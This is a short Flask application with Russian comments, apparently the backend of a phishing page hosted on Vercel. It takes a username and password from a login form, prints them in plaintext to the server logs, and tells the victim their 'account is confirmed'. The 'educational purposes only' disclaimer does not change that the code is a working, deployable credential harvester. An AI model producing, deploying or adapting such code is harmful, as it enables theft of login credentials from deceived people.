from flask import Flask, render_template, request, redirect, url_for

# Инициализация Flask-приложения
app = Flask(__name__)

# Маршрут для главной страницы (страницы входа)
@app.route('/')
def index():
    # Vercel будет искать 'index.html' в папке 'templates'
    return render_template('index.html')

# Маршрут для обработки отправки формы
@app.route('/login', methods=['POST'])
def login():
    if request.method == 'POST':
        # Получаем данные из формы
        username = request.form['username']
        password = request.form['password']

        # !!! ВАЖНО: Этот раздел предназначен только для образовательных целей. !!!
        # !!! В реальном приложении НИКОГДА не сохраняйте учетные данные таким образом. !!!
        # !!! В Serverless-среде Vercel запись в локальный файл не будет работать
        # !!! и данные не будут сохраняться между запросами.
        # !!! Для сохранения данных используйте базы данных (например, PostgreSQL, MongoDB)
        # !!! или облачные хранилища (например, Google Cloud Storage, AWS S3).

        # Вместо записи в файл, просто выведем в консоль Vercel (логи функции)
        # Эти логи будут доступны в вашей панели управления Vercel
        print(f"Попытка входа: Пользователь - {username}, Пароль - {password}")

        # Вы можете перенаправить пользователя на другую страницу
        # или показать сообщение после успешной "отправки"
        return "Спасибо, вы подтвердили свой аккаунт!"

# УДАЛИТЕ ИЛИ ЗАКОММЕНТИРУЙТЕ этот блок для деплоя на Vercel
# Этот блок нужен только для локальной разработки
# if __name__ == '__main__':
#     app.run(debug=True)

# Vercel будет импортировать 'app' напрямую, без необходимости 'if __name__ == "__main__":'
# Убедитесь, что ваш `vercel.json` указывает на `app.py` и использует `@vercel/python`